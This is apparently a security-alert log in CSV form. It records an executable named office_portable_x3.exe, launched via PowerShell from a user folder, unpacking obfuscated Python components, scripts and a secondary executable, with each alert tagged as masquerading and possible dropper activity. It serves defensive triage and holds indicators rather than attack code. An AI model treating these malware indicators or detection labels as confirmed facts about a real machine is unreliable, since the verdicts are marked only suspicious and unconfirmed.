Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:23:27.263",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\select.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B7ACC996
"Jun 1, 2026 @ 14:23:27.257",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\pyarmor_runtime_000000\pyarmor_runtime.pyd,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7CADCE14
"Jun 1, 2026 @ 14:23:27.258",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python3.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-35DB7C61
"Jun 1, 2026 @ 14:23:27.245",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\pack.js,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7EF0E4F0
"Jun 1, 2026 @ 14:23:27.241",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002a.txt,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5BEB7D47
"Jun 1, 2026 @ 14:23:27.253",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libffi-8.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2EFA0A3F
"Jun 1, 2026 @ 14:23:27.240",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002.xml,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BEB2BEB4
"Jun 1, 2026 @ 14:23:21.976",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Public\Pictures\kelotopu\xuvotopo.xml,,creation,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7302FC5D
"Jun 1, 2026 @ 14:23:26.917",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-45558092
"Jun 1, 2026 @ 14:23:27.238",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\base_library.zip,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AC6A0A42
"Jun 1, 2026 @ 14:23:05.885",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B86526C3
"Jun 1, 2026 @ 14:23:05.048",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python313.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F379EBAD
"Jun 1, 2026 @ 14:23:05.049",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\select.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D19A1345
"Jun 1, 2026 @ 14:23:05.059",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\unicodedata.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-B79803E7
"Jun 1, 2026 @ 14:23:05.060",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DE25458E
"Jun 1, 2026 @ 14:23:04.980",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libffi-8.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F8362D32
"Jun 1, 2026 @ 14:23:04.982",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\psutil\_psutil_windows.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F4930AAD
"Jun 1, 2026 @ 14:23:04.990",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\pyarmor_runtime_000000\pyarmor_runtime.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-753EFB75
"Jun 1, 2026 @ 14:23:04.992",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python3.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-792E6267
"Jun 1, 2026 @ 14:23:04.979",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libcrypto-3.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9370E0F6
"Jun 1, 2026 @ 14:23:04.934",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\uusd.exe,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8083FF1B
"Jun 1, 2026 @ 14:23:04.862",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-894F0127
"Jun 1, 2026 @ 14:23:04.858",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_wmi.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BE497586
"Jun 1, 2026 @ 14:23:05.659",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5B0AD7E5
"Jun 1, 2026 @ 14:23:05.692",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-508CBE48
"Jun 1, 2026 @ 14:23:05.727",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DF98FB51
"Jun 1, 2026 @ 14:22:58.527",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\base_library.zip,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-1901A7C3
"Jun 1, 2026 @ 14:22:58.502",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2C36A514
"Jun 1, 2026 @ 14:22:58.494",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_decimal.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-197AB1AA
"Jun 1, 2026 @ 14:22:58.496",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6255940D
"Jun 1, 2026 @ 14:22:58.499",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_lzma.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-93D2236C
"Jun 1, 2026 @ 14:22:58.505",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_wmi.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F3624544
"Jun 1, 2026 @ 14:22:58.503",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_uuid.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-97636474
"Jun 1, 2026 @ 14:23:04.836",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\base_library.zip,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7CBB2BAD
"Jun 1, 2026 @ 14:23:27.239",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\campus.py,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-626C1FAB
"Jun 1, 2026 @ 14:23:05.520",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6D5755D6
"Jun 1, 2026 @ 14:23:05.547",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BA96CB55
"Jun 1, 2026 @ 14:23:05.603",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-42F0C708
"Jun 1, 2026 @ 14:23:05.632",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8DD45453
"Jun 1, 2026 @ 14:23:05.323",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2488E5A2
"Jun 1, 2026 @ 14:23:05.398",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-FD13C882
"Jun 1, 2026 @ 14:23:05.430",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-33C6281D
"Jun 1, 2026 @ 14:23:05.455",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-42637676
"Jun 1, 2026 @ 14:23:04.849",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A10EB4ED
"Jun 1, 2026 @ 14:23:04.848",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\pyarmor_runtime_000000\pyarmor_runtime.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C9FA6D83
"Jun 1, 2026 @ 14:23:04.850",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-966AE6E1
"Jun 1, 2026 @ 14:23:04.837",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\campus.py,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-62A3FFBE
"Jun 1, 2026 @ 14:23:04.839",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002w.txt,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-566E0CF2
"Jun 1, 2026 @ 14:23:04.844",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libcrypto-3.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-468E056F
"Jun 1, 2026 @ 14:23:04.846",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libffi-8.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3F8DE490
"Jun 1, 2026 @ 14:23:04.847",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\psutil\_psutil_windows.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-61DE0D3F
"Jun 1, 2026 @ 14:23:04.824",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\pack.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-67B81684
"Jun 1, 2026 @ 14:23:04.766",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_lzma.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3680EE0C
"Jun 1, 2026 @ 14:23:04.770",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_uuid.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-38236DC0
"Jun 1, 2026 @ 14:23:04.768",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_socket.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9848B06E
"Jun 1, 2026 @ 14:23:04.788",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\base_library.zip,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5A9240B8
"Jun 1, 2026 @ 14:23:04.795",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\campus.py,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3C766FA7
"Jun 1, 2026 @ 14:23:04.796",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002.xml,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-31816856
"Jun 1, 2026 @ 14:23:04.772",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_wmi.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-08541F53
"Jun 1, 2026 @ 14:22:58.545",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_n.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-57F4B3AD
"Jun 1, 2026 @ 14:22:58.569",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002a.txt,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-57D61B12
"Jun 1, 2026 @ 14:22:58.572",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002w.txt,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-275546C1
"Jun 1, 2026 @ 14:22:58.573",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9D92EBE1
"Jun 1, 2026 @ 14:22:58.683",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\uusd.exe,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5E6559C1
